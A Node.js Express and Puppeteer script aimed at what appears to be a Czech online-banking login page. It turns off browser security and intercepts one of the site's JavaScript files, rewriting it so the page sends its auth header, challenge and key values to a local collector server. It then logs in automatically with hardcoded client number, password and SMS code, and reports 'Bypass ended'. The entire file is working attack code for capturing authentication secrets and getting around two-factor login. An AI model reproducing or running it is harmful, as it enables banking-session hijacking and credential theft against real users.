require('dotenv').config();
const puppeteer = require("puppeteer");
const {
  RequestInterceptionManager,
} = require("puppeteer-intercept-and-modify-requests");

const express = require('express');
const app = express();

let browser, page, client;

app.get('/start', async (req, res) => {
  browser = await puppeteer.launch({
    headless: false,
    // slowMo: 150,
    defaultViewport: null,
    ignoreHTTPSErrors: true,
    args: ["--disable-web-security", `--proxy-server=${process.env.PROXY_SERVER}`, '--disable-dev-shm-usage', '--disable-setuid-sandbox', '--no-sandbox', '--unlimited-storage', '--full-memory-crash-report'],
  });
  res.end('Browser started');
});

app.get('/run', async (req, res) => {
  page = await browser.newPage();
  client = await page.target().createCDPSession();
  const interceptManager = new RequestInterceptionManager(client);

  await interceptManager.intercept({
    // specify the URL pattern to intercept:
    urlPattern: process.env.URL_JS_SCRIPT_TO_INJECT,
    // specify how you want to modify the response (may be async):
    modifyResponse({ body }) {
      return {
        body: body.replaceAll(
            'G.Buffer.from(re,"base64")',
            "G.Buffer.from(re, \"base64\");fetch('http://localhost:3000/authHeader', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ authHeader: this.authHeader, challenge: this.challenge, index: this.index, key: this.key }) }).then((response) => response.json()).then((data) => console.log('Response from server:', data)).catch((error) => console.error('Error sending request:', error));      "
          )
      };
    },
  });

  await page.goto(process.env.BASE_PAGE);

  // Wait for the login form to load by waiting for a specific selector to appear
  await page.waitForSelector("form.tb-form2");

  // Fill in the username and password
  await page.type('input[aria-label="Číslo klienta"]', "50959551");
  await page.type('input[aria-label="Heslo"]', "heslo123");

  // Click the login button
  await page.evaluate(() => {
    document
      .querySelector(
        "#tb-application > tb-app > ng-component > div > div > div > tb-login > div > tb-login-auth > div > div > form > tb-button:nth-child(2)"
      )
      .shadowRoot.querySelector("button")
      .click();
  });

  await page.waitForTimeout(1500);

  try {
    // Fill in the username and password
  await page.type('input[aria-label="SMS kód"]', "111111");

  // Click the login button
  await page.evaluate(() => {
    document
      .querySelector(
        "#tb-application > tb-app > ng-component > div > div > div > tb-login > div > tb-login-auth > div > div > form > div > tb-button"
      )
      .shadowRoot.querySelector("button")
      .click();
  });
  
  await page.waitForTimeout(1500);

  await page.evaluate(() => {
    document.querySelector("#tb-application > tb-app > ng-component > div > div > div > ng-component > div > div > div > form > tb-button:nth-child(3)").shadowRoot.querySelector("button").click();
  });
  } catch (e) {
    console.log(e)
  }
  res.end('Bypass ended');
})

app.use(function(err, req, res, next) {
  res.status(err.status || 500).json(response.error(err.status || 500));
});

app.listen(5173)